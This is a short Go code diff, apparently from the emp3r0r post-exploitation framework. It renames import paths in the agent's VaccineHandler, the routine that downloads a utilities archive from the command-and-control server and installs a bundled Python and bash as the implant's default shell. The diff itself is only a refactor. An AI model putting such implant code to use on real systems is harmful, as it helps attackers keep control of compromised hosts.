@@ -12,9 +12,9 @@ import (
 	"log"
 	"os"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	exe_utils "github.com/jm33-m0/emp3r0r/core/internal/exe_utils"
-	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -28,16 +28,16 @@ func VaccineHandler(download_addr, checksum string) (out string) {
 			"LD_LIBRARY_PATH=%s/lib %s ",
 			PythonPath, PythonLib,
 			RuntimeConfig.UtilsPath, RuntimeConfig.UtilsPath+"/python3")
-		PythonLauncher   = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_def.DefaultShell, PythonCmd)
+		PythonLauncher   = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", def.DefaultShell, PythonCmd)
 		UtilsArchivePath = RuntimeConfig.AgentRoot + "/" + UtilsArchive
 	)
 
 	// do not download if already downloaded
-	if util.IsFileExist(UtilsArchivePath) && emp3r0r_crypto.SHA256SumFile(UtilsArchivePath) == checksum {
+	if util.IsFileExist(UtilsArchivePath) && crypto.SHA256SumFile(UtilsArchivePath) == checksum {
 		log.Printf("%s already exists, skipping download", UtilsArchivePath)
 	}
 
-	log.Printf("Downloading utils from %s", emp3r0r_def.CCAddress+"www/"+UtilsArchive)
+	log.Printf("Downloading utils from %s", def.CCAddress+"www/"+UtilsArchive)
 	_, err := SmartDownload(download_addr, UtilsArchive, UtilsArchivePath, checksum)
 	out = "[+] Utils have been successfully installed"
 	if err != nil {
@@ -123,7 +123,7 @@ func VaccineHandler(download_addr, checksum string) (out string) {
 	// set DefaultShell
 	custom_bash := fmt.Sprintf("%s/bash", RuntimeConfig.UtilsPath)
 	if util.IsFileExist(custom_bash) {
-		emp3r0r_def.DefaultShell = custom_bash
+		def.DefaultShell = custom_bash
 	}
 
 	return
